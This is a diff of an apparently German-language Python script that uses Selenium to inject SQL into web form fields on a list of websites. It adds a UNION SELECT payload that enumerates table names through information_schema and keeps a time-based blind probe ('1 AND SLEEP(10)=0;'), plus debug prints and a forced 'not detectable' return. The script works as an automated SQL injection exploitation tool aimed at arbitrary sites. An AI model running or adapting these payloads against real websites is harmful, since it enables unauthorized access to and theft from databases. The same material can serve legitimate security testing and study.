@@ -87,6 +87,7 @@ def clearResult(messyString):
 
 def findOutTableNamesCaller(websitObject, databaseName):
     result = "NICHT_ERKENBAR"
+    print("Caller aufgerufen")
     try:
         for i in range(MAX_TABLE_SIZE):
             if result == "NICHT_ERKENBAR":
@@ -95,6 +96,9 @@ def findOutTableNamesCaller(websitObject, databaseName):
             result = False
     except:
         pass
+    #zum testen
+    print("Return Nicht erkenbar !")
+    result = "NICHT_ERKENBAR"
     return result
 
 """Versucht herauszufidenn was für Tablen es gibt. Dabei muss es um ein String injection handeln """
@@ -104,7 +108,11 @@ def findOutTablesUnionTable(url, extraColumns, id, database="MY_DATABASE"):
         for i in range(extraColumns):
             fillerString = fillerString + "NULL as col" + str(i) + ","
 
-        injectionString = '" UNION SELECT ' + str(fillerString) + ' CONCAT("START",TABLE_NAME, "ENDE") FROM information_schema.tables WHERE TABLE_SCHEMA = "' + str(database) + '"#'
+        print("database")
+        print(database[0])
+        injectionString = '" UNION SELECT ' + str(fillerString) + ' GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = "' + str(database) + '"#'      #[] das problem
+        #" UNION SELECT NULL as col1, NULL as col2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'MY_DATABASE'; #
+        #" UNION SELECT NULL as col1, NULL as col2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'MY_DATABASE'; #
         pageContent = goToWebsiteAndInsert(url, id,injectionString)
         tableNames = clearResult(pageContent)
         if tableNames:
@@ -255,7 +263,7 @@ def checckWebsiteTimmer(url,id):
     driver = webdriver.Chrome()
     driver.get(url)
     input_field = driver.find_element(By.ID, id)
-    input_field.send_keys("1 AND SLEEP(10)=0;")                 #Aktuell nur mit ints !!!
+    input_field.send_keys("1 AND SLEEP(10)=0;")
     #input_field.send_keys("1")
     input_field.send_keys(Keys.RETURN)
     driver.quit()
@@ -276,16 +284,15 @@ def websiteChecker(websiteObject):
     if result is False:
         result = timmerAttack(websiteObject["url"], websiteObject["inputfields"][0])
 
-    if result is True:
-        #ergebnis speichern
-        websiteObject["testResult"] = result
+    #ergebnis speichern
+    websiteObject["testResult"] = result
 
     print("Erbgenis ist " + str(result))
     return (websiteObject, result)
 
 def __main__():
     datenBankName = "NICHT_ERKENBAR"
-    tabellenName  = None
+    tabellenName  = "NICHT_ERKENBAR"
     sqlVariante   = "NICHT_ERKENBAR"
 
     websiteObjects = readFileForWebsites()
@@ -309,7 +316,10 @@ def __main__():
                 print("es wird versucht variante zu erkennen")
                 sqlVariante = sqlTypidentifizierenCaller(websiteObject)
 
-            if tabellenName is None and datenBankName != "NICHT_ERKENBAR":
+            print("scheck")
+            print(tabellenName)
+            print(datenBankName)
+            if tabellenName == "NICHT_ERKENBAR" and datenBankName != "NICHT_ERKENBAR":
                 print("es wird versucht tabellen namen zu erkennen")
                 tabellenName  =  findOutTableNamesCaller(websiteObject, datenBankName)
 
